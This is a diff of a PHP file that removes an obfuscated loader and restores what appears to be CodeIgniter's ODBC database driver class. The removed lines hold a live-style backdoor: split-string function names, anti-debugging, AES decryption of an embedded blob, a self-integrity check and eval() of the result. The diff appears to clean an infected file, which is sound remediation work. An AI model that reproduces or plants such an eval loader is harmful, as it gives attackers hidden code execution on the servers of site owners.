@@ -1,28 +1,369 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_gie6rves=('bas'.'e64'.'_de'.'cod'.'e');
-$_t40cxl3e=('gzu'.'nco'.'mpr'.'ess');
-$_a3o134lh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_gvq6tl4z='Xpo6B+XW';
-$_ci5y4m9x='n0i2fcA/';
-$_msqpjx4v='YQF5FrUi';
-$_ntymukoi='0sgguPZB';
-$_uq81mkro='r8ZKg0PW/a0=';
-$_jyfntgt9='O12Ufg==';
-$_c2mfswfi='1LSeYxhl';
-$_ypnp01oi='Krlskaq2';
-$_i5pyq3jo=$_gie6rves($_ntymukoi.$_gvq6tl4z.$_ci5y4m9x.$_msqpjx4v.$_uq81mkro);
-$_dud6szrm=$_gie6rves($_c2mfswfi.$_ypnp01oi.$_jyfntgt9);
-$_rbps5jjk=$_gie6rves('Lx8E9wkHXTfoWIp2QOPdujit4cua5oGnT0eWcKMJSrF2vt2O4XJ9KQq3mCGropPkeFSJX1CzItMbsMCRlnDyTQiZGzn9fvQyssETmxgoJaudyw1z0zjxXaKhuKcMOI1hxBPLV5UfxQ45lgYunwUOZPeTj7e4c/1o0x+8cu7Q14ROL6xLII+CjqUTFuBToFyNBpTh9UHk/zHRl55JbCHNLjLikXh1Qj25G215TMRRS2FiTqNqSJMwjzj5it3/pvy0/5ge3+c523Yl5DPLKDcZBgL/jyopiUyx3tul40udODNRbbG3bF9LN1FdS0VLAQAKQ/QFhZebZ47WdiCyyRk9G0CBgW1GDzouYrdl5YWxLiDRNviUM1ifvhYvSaZrsHfh7lTFA88uSKNLTNtrxX76xwVyr/KA7SVB0kfQ6Y1JxUhiODQMgSRIhA/x3cLM2CvALgdv4h9UPX7Oqwe7IS8Sxm+ARgcA0r2xD/B+WrYXsLWzHzSuZz9fPKe3UE6YkcOWtKQc8YIBqQBEw1KvZnqxY7baOopFEpgefPZc7uPC49U9yK491pQrrNn8DtHfZsCGCQLYqKX21eJjC+D9g1tJaXvEauVgdxpKK6xa2t9YvAiiiLMsgQUgQVqwHa/dzp7i6eS6CNGgalG8eeNqnkQaox1JN4Db+tg2XPW3iSSaJNBxLolEWhV/zuZddevZ8jABYeLiMPfRiLJFZu5VKP8nXpAgxUHu0QYobNulkcMj8oKoAEaTvvs+Yrh4H85sqXd85Wd6eujNderJDrMvSByxqtxBU3Jw5MVCfprh7HE11NuD1h3gYWR/te7bEIcAbI9yGn0uuZ8VNqX7NY8tPqPdhEfQc+9/l5bcibT4cXj0ch+g8+3SkYddeIVI3PVbcPpicXEd5YVN8ImrgPfEShJ5aBed2g3XMGNsco6j+l8vxWfvgogLtfpgOemm3TAbvTfKrah8gCSN42fygkAFjSNKFm7TCQ5VsZgSE47my9pl1phoahGxP5mYFTHXqX2lHFd5uFxNSUptgdVxMrwK4nSIcFaGKbqFszWMtOQSuU8LIsU4HBpSSqMN93J4DWczHhBmkE33XUg1Z5J14txXjyARMDvU2+Ogg87ik3bCc0VGb5yHn0XUBgpggA+T/YU33wu93F4RZOvuKyplblOeXtRABApq0T5pHtIeUeu4TmXtHjSYisHAGFhuzA49Ka484mZtP8hb2AB9E9L1VRu0wCQUQB3vbTG1ONhucijkZp8umaSYr+pQ/hVsW9CwniOKHRZqESxWzb2Yix+bgyHWs3FBAq+Dk1XrETXBvzKT0eb8cgarC80gBd7kjZG6MhK6PVAtwavxghyumAGNuVxudSE/dRg189RH3N5oy896ToTqYs03Nyb+/7w4mYsam8XqetAAFcXUqj563Mv5KxQHb/A6EyC7jo0ZGs5fuF+4evgXfWENFCpyYhk2psmcQlKjewECNDY8zouMgG62qB1c+Dzw/D8pwD9Yi0/U3rJqwykm8G0Rr03/k52Ylf3yt8hpZeAytzxhY0X0HHvAcMdEBXRmQZx+b3M4KPecXPKtlONB+oIVIlfcCX9ozWY28cC6elR/+4bmwwuEzMjR4Ptg/3sE8dYTiZeFSth0wMLmSg77setJMHp6AvhKQcy2rLmQe4v6ZicgdMTw3/IpIzbc+6LAs6ldxhlavufWc0e0bPvh8eEbXZU/bKnIcNe63ETibQxMF4V0RJbZHZQ/n7amAivxTg==');
-$_iwhvjbez=$_a3o134lh($_rbps5jjk,'aes-256-cbc',$_i5pyq3jo,OPENSSL_RAW_DATA,$_dud6szrm);
-if($_iwhvjbez===false){exit;}
-$_e6txw146=$_t40cxl3e($_iwhvjbez);
-if($_e6txw146===false){exit;}
-$_m0txb35l='74d5d3ac6f71b8b91bb10119f6ff845bda345f9871300e334b5d0622670b756e';
-$_oi9ty2q8=@file_get_contents(__FILE__);
-if($_oi9ty2q8!==false){
-$_xp1pa7j7=str_replace($_m0txb35l,"0000000000000000000000000000000000000000000000000000000000000000",$_oi9ty2q8);
-$_ia7szrx0=hash("sha256",$_xp1pa7j7);
-if($_ia7szrx0!==$_m0txb35l){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_odbc_driver extends CI_DB_driver {
+
+
+
+
+
+public $dbdriver = 'odbc';
+
+
+
+
+
+public $schema = 'public';
+
+
+
+
+
+
+
+
+protected $_escape_char = '';
+
+
+
+
+
+protected $_like_escape_str = " {escape '%s'} ";
+
+
+
+
+
+protected $_random_keyword = array('RND()', 'RND(%d)');
+
+
+
+
+
+
+private $odbc_result;
+
+
+
+
+
+private $binds = array();
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+
+if (empty($this->dsn))
+{
+$this->dsn = $this->hostname;
 }
-eval($_e6txw146);
+}
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+return ($persistent === TRUE)
+? odbc_pconnect($this->dsn, $this->username, $this->password)
+: odbc_connect($this->dsn, $this->username, $this->password);
+}
+
+
+
+
+
+
+
+
+public function compile_binds($sql, $binds)
+{
+if (empty($binds) OR empty($this->bind_marker) OR strpos($sql, $this->bind_marker) === FALSE)
+{
+return $sql;
+}
+elseif ( ! is_array($binds))
+{
+$binds = array($binds);
+$bind_count = 1;
+}
+else
+{
+
+$binds = array_values($binds);
+$bind_count = count($binds);
+}
+
+$ml = strlen($this->bind_marker);
+
+if ($c = preg_match_all("/'[^']*'|\"[^\"]*\"/i", $sql, $matches))
+{
+$c = preg_match_all('/'.preg_quote($this->bind_marker, '/').'/i',
+str_replace($matches[0],
+str_replace($this->bind_marker, str_repeat(' ', $ml), $matches[0]),
+$sql, $c),
+$matches, PREG_OFFSET_CAPTURE);
+
+if ($bind_count !== $c)
+{
+return $sql;
+}
+}
+elseif (($c = preg_match_all('/'.preg_quote($this->bind_marker, '/').'/i', $sql, $matches, PREG_OFFSET_CAPTURE)) !== $bind_count)
+{
+return $sql;
+}
+if ($this->bind_marker !== '?')
+{
+do
+{
+$c--;
+$sql = substr_replace($sql, '?', $matches[0][$c][1], $ml);
+}
+while ($c !== 0);
+}
+if (FALSE !== ($this->odbc_result = odbc_prepare($this->conn_id, $sql)))
+{
+$this->binds = array_values($binds);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+if ( ! isset($this->odbc_result))
+{
+return odbc_exec($this->conn_id, $sql);
+}
+elseif ($this->odbc_result === FALSE)
+{
+return FALSE;
+}
+if (TRUE === ($success = odbc_execute($this->odbc_result, $this->binds)))
+{
+
+$this->is_write_type($sql) OR $success = $this->odbc_result;
+}
+$this->odbc_result = NULL;
+$this->binds = array();
+return $success;
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+return odbc_autocommit($this->conn_id, FALSE);
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+if (odbc_commit($this->conn_id))
+{
+odbc_autocommit($this->conn_id, TRUE);
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+if (odbc_rollback($this->conn_id))
+{
+odbc_autocommit($this->conn_id, TRUE);
+return TRUE;
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+public function is_write_type($sql)
+{
+if (preg_match('#^(INSERT|UPDATE).*RETURNING\s.+(\,\s?.+)*$#is', $sql))
+{
+return FALSE;
+}
+return parent::is_write_type($sql);
+}
+
+
+
+
+
+
+
+protected function _escape_str($str)
+{
+$this->display_error('db_unsupported_feature');
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return odbc_num_rows($this->result_id);
+}
+
+
+
+
+
+
+public function insert_id()
+{
+return ($this->db_debug) ? $this->display_error('db_unsupported_feature') : FALSE;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = '".$this->schema."'";
+if ($prefix_limit !== FALSE && $this->dbprefix !== '')
+{
+return $sql." AND table_name LIKE '".$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SHOW COLUMNS FROM '.$table;
+}
+
+
+
+
+
+
+
+
+
+protected function _field_data($table)
+{
+return 'SELECT TOP 1 FROM '.$table;
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+return array('code' => odbc_error($this->conn_id), 'message' => odbc_errormsg($this->conn_id));
+}
+
+
+
+
+
+
+protected function _close()
+{
+odbc_close($this->conn_id);
+}
+}
